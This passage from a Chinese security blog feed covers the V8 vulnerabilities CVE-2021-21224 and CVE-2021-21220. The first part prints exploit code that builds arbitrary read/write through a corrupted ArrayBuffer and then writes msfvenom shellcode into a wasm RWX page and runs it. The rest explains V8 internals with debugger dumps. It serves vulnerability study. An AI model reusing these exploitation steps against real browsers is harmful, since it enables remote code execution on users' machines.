&lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x55fdec3bfdf0</span><br><span class="line"> - byte_length: 4096</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x07660804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x76608212b89: [String] in OldSpace: #slot: 45887 (const data field 0), location: in-object</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>不过到目前为止我们只获得了低四位的地址，并不能进行绝对地址写，我们需要获得当前空间的高四位基址，可以通过以下的代码进行实现，最终得到的this.base为基址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里采用了地址压缩，定位基址的采用了通过rwarr访问baseAddr的方式</span></span><br><span class="line">   <span class="keyword">let</span> corrupt_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(corrupt_buff);                  <span class="comment">//通过corrupt_view操作corrupt_buff的backing_store属性进行任意地址读写。</span></span><br><span class="line">   <span class="keyword">let</span> corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);                         <span class="comment">//corrupt_buffer_ptr： 0x103082f18a1 ，corrupt_buffer_ptr_low： 0x82f18a0</span></span><br><span class="line">   <span class="keyword">let</span> idx0Addr = corrupt_buffer_ptr_low - <span class="number">0x10</span>;                                                                               <span class="comment">//rwarr[0]的位置： 0x82f1890</span></span><br><span class="line">   <span class="keyword">let</span> baseAddr = (corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) - ((corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) % <span class="number">0x40000</span>) + <span class="number">0x40000</span>;         <span class="comment">//获得基址： 0x8300000   0x82f0000-0x30000+0x40000    </span></span><br><span class="line">   <span class="keyword">let</span> delta = baseAddr + <span class="number">0x1c</span> - idx0Addr;                       <span class="comment">//0xe78c  ,rwarr[0]距离目标的实际大小</span></span><br><span class="line">   <span class="keyword">if</span> ((delta % <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = delta / <span class="number">8</span>;</span><br><span class="line">       <span class="built_in">this</span>.base = f2i(rwarr[baseIdx]);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = ((delta - (delta % <span class="number">8</span>)) / <span class="number">8</span>);                <span class="comment">//0x1cf1</span></span><br><span class="line">       <span class="built_in">this</span>.base = f4i(rwarr[baseIdx]);                          <span class="comment">//0x103</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最终可以通过setbackingStore操作地址进行任意地址读写，泄露出rwx地址并写入shellcode，最终执行shellcode</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmInsAddr = leakObjLow(wasmInstance);    setbackingStore(wasmInsAddr, <span class="built_in">this</span>.base);                           <span class="keyword">let</span> rwx_page_addr = corrupt_view.getFloat64(<span class="number">0x68</span>, <span class="literal">true</span>);      <span class="comment">//获得rwx_page_addr,在偏移0x68的位置上    setbackingStore(f2i(rwx_page_addr), f4i(rwx_page_addr));    for (let i = 0; i &lt; shellcode.length; i++) &#123;        corrupt_view.setUint8(i, shellcode[i]);    &#125;    f();</span></span><br></pre></td></tr></table></figure><p>使用的shellcode如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=&quot;echo pwn&quot; -f num exitfunc=thread -a x64    let shellcode = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x09, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x70, 0x77, 0x6e, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05];</span></span><br></pre></td></tr></table></figure><p>最终复现结果如下</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210510163239760.png" alt="image-20210510163239760"></p><h3 id="3、漏洞修复"><a href="#3、漏洞修复" class="headerlink" title="3、漏洞修复"></a>3、漏洞修复</h3><p>issue 1195777</p><p><a class="link"   href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html" >https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html<i class="fas fa-external-link-alt"></i></a></p><h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞为CVE-2021-21220的exp公开不久后公布的，是2021HW中的两枚重磅炸弹，虽然都不可以进行沙箱逃逸，但是仍然可以在一些不开启沙箱的情况下进行使用。该公开的exp的利用手法比较巧妙，通过corrupt_arr修改rwarr数组长度，rwarr具有八字节读写能力，之后通过rwarr相对地址读写可以操作corrupt_buff进而造成任意地址读写</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1]. <a class="link"   href="http://noahblog.360.cn/chromium_v8_remote_code_execution_vulnerability_analysis/" >http://noahblog.360.cn/chromium_v8_remote_code_execution_vulnerability_analysis/<i class="fas fa-external-link-alt"></i></a></p><p>[2]. <a class="link"   href="https://github.com/avboy1337/1195777-chrome0day" >https://github.com/avboy1337/1195777-chrome0day<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;V8远程代码执行漏洞&quot;&gt;&lt;a href=&quot;#V8远程代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;V8远程代码执行漏洞&quot;&gt;&lt;/a&gt;V8远程代码执行漏洞&lt;/h1&gt;&lt;h2 id=&quot;一、漏洞信息&quot;&gt;&lt;a href=&quot;#一、漏洞信息&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2021-21220</title>
    <link href="https://fa1lr4in.github.io/2021/04/30/CVE-2021-21220/"/>
    <id>https://fa1lr4in.github.io/2021/04/30/CVE-2021-21220/</id>
    <published>2021-04-30T08:38:26.000Z</published>
    <updated>2021-04-30T08:39:35.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V8远程代码执行漏洞"><a href="#V8远程代码执行漏洞" class="headerlink" title="V8远程代码执行漏洞"></a>V8远程代码执行漏洞</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul><li>漏洞名称：V8远程代码执行漏洞</li><li>漏洞编号：CVE-2021-21220</li><li>漏洞类型：JIT优化导致可构造超长数组进行任意地址读写</li><li>漏洞影响：远程代码执行</li><li>CVSS3.0：N/A</li><li>CVSS2.0：N/A</li><li>漏洞危害等级：严重</li></ul><h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。</p><h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p>issue 1196683</p><h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p>Chrome最新版本已经修复，请用户及时更新至最新版本。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装89.0.4389.90的Chrome浏览器</p><h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><p>1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。</p><p>2、将漏洞文件拖入浏览器中执行</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210421222934275.png" alt="image-20210421222934275"></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul><li>漏洞文件：instruction-selector-x64.cc</li><li>漏洞函数：InstructionSelector::VisitChangeInt32ToInt64</li></ul><h3 id="2、背景知识"><a href="#2、背景知识" class="headerlink" title="2、背景知识"></a>2、背景知识</h3><p>(1) js中array-shift实现。</p><p>v8源码版本: V8 version 9.1.0 (candidate)</p><h4 id="（1）array-shift-tq"><a href="#（1）array-shift-tq" class="headerlink" title="（1）array-shift.tq"></a>（1）array-shift.tq</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2019 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> array &#123;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> builtin <span class="title">ArrayShift</span><span class="params">(Context, JSFunction, JSAny, int32)</span>: JSAny;</span></span><br><span class="line"></span><br><span class="line"><span class="function">macro <span class="title">TryFastArrayShift</span><span class="params">(implicit context: Context)</span><span class="params">(receiver: JSAny)</span>: JSAny</span></span><br><span class="line"><span class="function">    labels Slow, Runtime &#123;</span></span><br><span class="line">  <span class="keyword">const</span> array: FastJSArray = Cast&lt;FastJSArray&gt;(receiver) otherwise Slow;</span><br><span class="line">  let witness = <span class="built_in">NewFastJSArrayWitness</span>(array);</span><br><span class="line"></span><br><span class="line">  witness.<span class="built_in">EnsureArrayPushable</span>() otherwise Slow;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (array.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> newLength = array.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check that we&#x27;re not supposed to right-trim the backing store, as</span></span><br><span class="line">  <span class="comment">// implemented in elements.cc:ElementsAccessorBase::SetLengthImpl.</span></span><br><span class="line">  <span class="keyword">if</span> ((newLength + newLength + kMinAddedElementsCapacity) &lt;</span><br><span class="line">      array.elements.length) &#123;</span><br><span class="line">    <span class="keyword">goto</span> Runtime;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check that we&#x27;re not supposed to left-trim the backing store, as</span></span><br><span class="line">  <span class="comment">// implemented in elements.cc:FastElementsAccessor::MoveElements.</span></span><br><span class="line">  <span class="keyword">if</span> (newLength &gt; kMaxCopyElements) <span class="keyword">goto</span> Runtime;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = witness.<span class="built_in">LoadElementOrUndefined</span>(<span class="number">0</span>);</span><br><span class="line">  witness.<span class="built_in">ChangeLength</span>(newLength);</span><br><span class="line">  witness.<span class="built_in">MoveElements</span>(<span class="number">0</span>, <span class="number">1</span>, Convert&lt;intptr&gt;(newLength));</span><br><span class="line">  witness.<span class="built_in">StoreHole</span>(newLength);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">transitioning macro <span class="title">GenericArrayShift</span><span class="params">(implicit context: Context)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    receiver: JSAny)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="comment">// 1. Let O be ? ToObject(this value).</span></span><br><span class="line">  <span class="keyword">const</span> object: JSReceiver = <span class="built_in">ToObject_Inline</span>(context, receiver);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. Let len be ? ToLength(? Get(O, &quot;length&quot;)).</span></span><br><span class="line">  <span class="keyword">const</span> length: Number = <span class="built_in">GetLengthProperty</span>(object);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. If len is zero, then</span></span><br><span class="line">  <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// a. Perform ? Set(O, &quot;length&quot;, 0, true).</span></span><br><span class="line">    <span class="built_in">SetProperty</span>(object, kLengthString, Convert&lt;Smi&gt;(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">// b. Return undefined.</span></span><br><span class="line">    <span class="keyword">return</span> Undefined;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. Let first be ? Get(O, &quot;0&quot;).</span></span><br><span class="line">  <span class="keyword">const</span> first = <span class="built_in">GetProperty</span>(object, Convert&lt;Smi&gt;(<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// 5. Let k be 1.</span></span><br><span class="line">  let k: Number = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 6. Repeat, while k &lt; len</span></span><br><span class="line">  <span class="keyword">while</span> (k &lt; length) &#123;</span><br><span class="line">    <span class="comment">// a. Let from be ! ToString(k).</span></span><br><span class="line">    <span class="keyword">const</span> from: Number = k;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// b. Let to be ! ToString(k - 1).</span></span><br><span class="line">    <span class="keyword">const</span> to: Number = k - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// c. Let fromPresent be ? HasProperty(O, from).</span></span><br><span class="line">    <span class="keyword">const</span> fromPresent: Boolean = <span class="built_in">HasProperty</span>(object, from);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// d. If fromPresent is true, then</span></span><br><span class="line">    <span class="keyword">if</span> (fromPresent == True) &#123;</span><br><span class="line">      <span class="comment">// i. Let fromVal be ? Get(O, from).</span></span><br><span class="line">      <span class="keyword">const</span> fromValue: JSAny = <span class="built_in">GetProperty</span>(object, from);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ii. Perform ? Set(O, to, fromValue, true).</span></span><br><span class="line">      <span class="built_in">SetProperty</span>(object, to, fromValue);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// i. Perform ? DeletePropertyOrThrow(O, to).</span></span><br><span class="line">      <span class="built_in">DeleteProperty</span>(object, to, LanguageMode::kStrict);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// f. Increase k by 1.</span></span><br><span class="line">    k++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 7. Perform ? DeletePropertyOrThrow(O, ! ToString(len - 1)).</span></span><br><span class="line">  <span class="built_in">DeleteProperty</span>(object, length - <span class="number">1</span>, LanguageMode::kStrict);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 8. Perform ? Set(O, &quot;length&quot;, len - 1, true).</span></span><br><span class="line">  <span class="built_in">SetProperty</span>(object, kLengthString, length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 9. Return first.</span></span><br><span class="line">  <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://tc39.github.io/ecma262/#sec-array.prototype.shift</span></span><br><span class="line"><span class="function">transitioning javascript builtin <span class="title">ArrayPrototypeShift</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    js-implicit context: NativeContext, receiver: JSAny)</span><span class="params">(...arguments)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">TryFastArrayShift</span>(receiver) otherwise Slow, Runtime;</span><br><span class="line">  &#125; label Slow &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenericArrayShift</span>(receiver);</span><br><span class="line">  &#125; label Runtime &#123;</span><br><span class="line">    <span class="function">tail <span class="title">ArrayShift</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        context, LoadTargetFromFrame(), Undefined,</span></span></span><br><span class="line"><span class="params"><span class="function">        Convert&lt;int32&gt;(arguments.length))</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shift函数首先会判断数组的长度是否为0，如果为0，则不会对该数组进行修改；如果不为0，则会将最前面的数组元素pop，之后对<strong>数组长度减一</strong>。当然这里会有是否进行快速shift的选择[7]，由于不管是否进行快速shift都不会影响这个操作结果，所以具体快速shift如何对速度进行优化不在我们的考虑范围内。</p><h4 id="（2）smi"><a href="#（2）smi" class="headerlink" title="（2）smi"></a>（2）smi</h4><p>smi在js中为小整数，详见[5]，链接中讲述了v8中不同数据类型的实现。</p><p>smi类型中的-1，0，1在内存中的表示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x3c6c0808846d</span><br><span class="line">0x3c6c0808846d: [JSArray]</span><br><span class="line"> - map: 0x3c6c08243951 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3c6c0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3c6c0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3c6c080446c1: [String] in ReadOnlySpace: #length: 0x3c6c0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: -1</span><br><span class="line">           1: 0</span><br><span class="line">           2: 1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; telescope 0x3c6c082123e0</span><br><span class="line">00:0000│  0x3c6c082123e0 ◂— 0x608042531</span><br><span class="line">01:0008│  0x3c6c082123e8 ◂— 0xfffffffe</span><br><span class="line">02:0010│  0x3c6c082123f0 ◂— 0x80431b900000002</span><br><span class="line">03:0018│  0x3c6c082123f8 ◂— 0x82123e100000000</span><br><span class="line">04:0020│  0x3c6c08212400 ◂— 0x8042509</span><br><span class="line">05:0028│  0x3c6c08212408 ◂— 0x608042205</span><br><span class="line">06:0030│  0x3c6c08212410 ◂— 0x82123f5082123d5</span><br><span class="line">07:0038│  0x3c6c08212418 ◂— 0x8042a1d08212345</span><br></pre></td></tr></table></figure><p>可以看出-1在smi中表示为0xfffffffe，而0xfffffffe在十六进制有符号表示为-2，这块需要注意。</p><h4 id="（3）常见数据结构"><a href="#（3）常见数据结构" class="headerlink" title="（3）常见数据结构"></a>（3）常见数据结构</h4><h5 id="浮点型数组"><a href="#浮点型数组" class="headerlink" title="浮点型数组"></a>浮点型数组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x56008144335</span><br><span class="line">0x56008144335: [JSArray]</span><br><span class="line"> - map: 0x0560082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x05600820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x05600804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x560080446c1: [String] in ReadOnlySpace: #length: 0x05600818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20wx 0x56008144335-1</span><br><span class="line">0x56008144334:  0x082439f1      0x0804222d      0x08144315      0x00000006</span><br><span class="line">0x56008144344:  0x080455b9      0x08212999      0x08042205      0x00000004</span><br><span class="line">0x56008144354:  0x081442fd      0x08144335      0x08243a41      0x0804222d</span><br><span class="line">0x56008144364:  0x0814434d      0x00000004      0x080455b9      0x082129c5</span><br><span class="line">0x56008144374:  0x08042a95      0x00000002      0x00000000      0x41e00000</span><br><span class="line">pwndbg&gt; telescope 0x056008144314</span><br><span class="line">00:0000│  0x56008144314 ◂— 0x608042a95</span><br><span class="line">01:0008│  0x5600814431c ◂— 0x3ff199999999999a</span><br><span class="line">02:0010│  0x56008144324 ◂— 0x3ff3333333333333</span><br><span class="line">03:0018│  0x5600814432c ◂— 0x3ff4cccccccccccd</span><br><span class="line">04:0020│  0x56008144334 ◂— 0x804222d082439f1</span><br><span class="line">05:0028│  0x5600814433c ◂— 0x608144315</span><br><span class="line">06:0030│  0x56008144344 ◂— 0x8212999080455b9</span><br><span class="line">07:0038│  0x5600814434c ◂— 0x408042205</span><br></pre></td></tr></table></figure><p>根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。</p><h5 id="“smi数组”"><a href="#“smi数组”" class="headerlink" title="“smi数组”"></a>“smi数组”</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x367b082a9c29: [JSArray]</span><br><span class="line"> - map: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x367b0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x367b0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x367b080446c1: [String] in ReadOnlySpace: #length: 0x367b0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 0x367b0804242d &lt;the_hole&gt;</span><br><span class="line">           1: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x367b0804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x367b082a9c1d &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x367b08042a95 &lt;Map&gt;</span><br><span class="line">           6: 3</span><br><span class="line">           7: -858993459</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/12wx 0x367b082a9c1d-1</span><br><span class="line">0x367b082a9c1c: 0x08042205      0x0804242d      0x0804242d      0x082439c9</span><br><span class="line">0x367b082a9c2c: 0x0804222d      0x082a9c1d      0xfffffffe      0x08042a95</span><br><span class="line">0x367b082a9c3c: 0x00000006      0x9999999a      0x3ff19999      0x33333333</span><br><span class="line">pwndbg&gt; x/8wx 0x367b082a9c29-1</span><br><span class="line">0x367b082a9c28: 0x082439c9      0x0804222d      0x082a9c1d      0xfffffffe</span><br><span class="line">0x367b082a9c38: 0x08042a95      0x00000006      0x9999999a      0x3ff19999</span><br></pre></td></tr></table></figure><p>这是个伪smi数组，是由于本漏洞构造的超长数组的现场。</p><p>根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。（和上面的浮点型数组内存构造是相同的）</p><p>在本漏洞利用中，可以通过相对地址写覆盖浮点型数组的长度伪超长，使浮点型数组也具有相对地址读写的能力。</p><h4 id="4-指针压缩"><a href="#4-指针压缩" class="headerlink" title="(4)指针压缩"></a>(4)指针压缩</h4><p>参考[89]。64位v8程序中，堆指针高32位地址值是相同的，可以看下面某次v8的调试信息，高32位的的地址值为0xdf2，这个信息存储在寄存器R13位置处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 